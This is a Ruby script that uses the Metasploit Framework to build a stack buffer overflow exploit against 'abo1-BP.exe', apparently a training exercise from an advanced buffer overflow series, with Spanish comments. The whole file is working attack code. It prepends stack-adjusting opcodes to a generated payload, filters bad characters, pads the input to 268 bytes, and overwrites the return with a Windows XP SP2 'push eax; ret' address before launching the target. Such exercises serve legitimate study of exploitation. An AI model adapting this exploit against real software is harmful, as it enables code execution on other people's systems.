#!/usr/bin/ruby

$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', '..', '..', 'Archivos de Programa/Metasploit/Framework3/msf3/lib'))

require 'msf/base'
require 'optparse'

opcion = {}
argvparser = OptionParser.new do |x|
	x.on('--payload S', '-p', String) {|pay| opcion[:payload] = pay }
	x.on('--opciones O', '-o', String) {|opc| opcion[:options] = opc.gsub(/,/, " ") }
end

argvparser.parse! ARGV
framework = Msf::Simple::Framework.create

egg = framework.payloads.create(opcion[:payload])

sploit = "\x33\xc0\xb0\x08\x64\x8b\x18\x66\xb8\x50\x01\x03\xD8\x8b\xe3\x8b\xec\x81\xc4\xf0\xfe\xff\xff" # reservamos espacio en la pila
sploit << egg.generate_simple({'OptionStr' => opcion[:options], 'BadChars' => "\x00\x09\x0a\x0b\x20\x22\x26\x3c\x3e\x7c"})
sploit << Rex::Text.rand_text_alphanumeric(268-sploit.size)
sploit << [0x77be6fda].pack('V') # push eax;ret windows xp sp2

exec "C:\\abo\\abo1-BP.exe " + sploit
